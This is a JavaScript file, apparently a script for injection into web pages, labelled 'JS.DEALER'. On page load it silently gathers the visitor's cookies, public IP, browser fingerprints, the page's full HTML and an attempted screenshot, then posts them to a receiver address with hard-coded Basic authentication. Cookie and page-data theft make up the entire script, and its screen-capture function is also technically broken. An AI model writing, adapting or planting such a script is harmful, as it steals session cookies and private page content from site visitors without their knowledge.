
const DEALER_NAME = "JS.DEALER";
const MODE = "SENDER"; 
const URI_REZ = "RECIVER_URI"; 


async function sendDealerData() {
    
    const userAgent = navigator.userAgent;
    const ip = await getPublicIP(); 
    const fpUser = getFingerprintUser();
    const fpBrowser = getFingerprintBrowser();
    const fpRequest = document.location.href;
    const jsData = "YourJSData"; 
    const encodedPage = btoa(document.documentElement.outerHTML); 
    const encodedScr = await captureScreen(); 

    const requestData = {
        headers: {
            "User-Agent": userAgent
        },
        dealer_uri: document.referrer || "No referer",
        merca_uri: document.origin || "No origin",
        cookies: document.cookie,
        requestURL: window.location.href,
        method: "POST"
    };

    const data = {
        DEALER_NAME: DEALER_NAME,
        IP: ip,
        UA: encodeURIComponent(userAgent),
        FP_USER: fpUser,
        FP_BROWSER: fpBrowser,
        FP_REQUEST: fpRequest,
        HTML_ENCODED: encodedPage,
        SCREEN_ENCODED: encodedScr,
        JS_DATA: jsData,
        encoded_data: JSON.stringify(requestData),
        encoded_req: btoa(JSON.stringify(requestData))
    };

    if (MODE === "SENDER") {
        
        try {
            const response = await fetch(URI_REZ, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': 'Basic am9tb3phOmpvbW96YQ==', 
                },
                body: new URLSearchParams(data) 
            });

            if (response.ok) {
                console.log('Datos enviados correctamente');
            } else {
                console.error('Error al enviar los datos:', response.statusText);
            }
        } catch (error) {
            console.error('Error en la conexión:', error);
        }
    } else {
        console.log('Datos guardados en modo SAVER:', data);
    }
}


async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error obteniendo la IP:', error);
        return 'N/A';
    }
}


function getFingerprintUser() {
    return btoa(navigator.userAgent + navigator.language + navigator.platform);
}

function getFingerprintBrowser() {
    return btoa(navigator.appName + navigator.appVersion + navigator.vendor);
}


async function captureScreen() {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    context.drawImage(document.body, 0, 0);
    return canvas.toDataURL('image/png').replace(/^data:image\/png;base64,/, '');
}


window.onload = () => {
    sendDealerData();
};
